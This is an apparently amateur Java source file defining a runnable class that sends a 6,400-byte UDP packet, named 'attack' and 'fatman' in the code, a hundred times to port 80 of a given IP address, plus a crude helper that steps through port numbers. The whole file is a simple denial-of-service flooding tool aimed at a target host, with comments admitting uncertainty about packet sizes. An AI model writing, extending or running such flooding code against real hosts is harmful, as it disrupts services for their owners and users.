import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPRunnable implements Runnable
{
    private final String IPAddress; //
    UDPRunnable(String IPAddress)
    {
        this.IPAddress = IPAddress;
    }
    public int findValidPortNumber(int portnum){
        int portnum1 = portnum;
        if(portnum1 > 9999 || portnum1 < 0) {
            System.out.print("invalid port number"); //Out of normal port ranges
            return 0;
        }
        try {
            DatagramSocket findPort = new DatagramSocket(); //creates new datagramsocket
            InetAddress testAddress = InetAddress.getByName(IPAddress);
            byte test [] = new byte[64]; //creates a normal sized packet
            findPort.connect(testAddress,portnum1); //attempts to connect to forign port
            System.out.println("this is your vaild port");
            return portnum1;

        }
        catch(IOException e) {
            return   findValidPortNumber(portnum1 + 1);//increase the portnumber to find a valid port
        }

    }

    @Override
    public void run(){
        //80
        //int port = findValidPortNumber(80);
        try{
            int port = 80;
            DatagramSocket target = new DatagramSocket(); // creates new datagram socket, no port assigned
            byte [] attack = new byte [6400]; //crafts packet size, i think it is the largest possible size, unsure though
            InetAddress targetAddress = InetAddress.getByName(IPAddress); //establish the Inetaddress based on raw address
            target.connect(targetAddress, port); // connects socket to remote location
            DatagramPacket fatman  = new DatagramPacket(attack, attack.length, targetAddress,  80); //crafts packet based on established varibles
            for(int i = 1; i<= 100; i++)
            {
                target.send(fatman); //sends packet to target 100 times

            }
        }   //dont close socket
        catch(IOException e){e.printStackTrace();} //fail



    }
}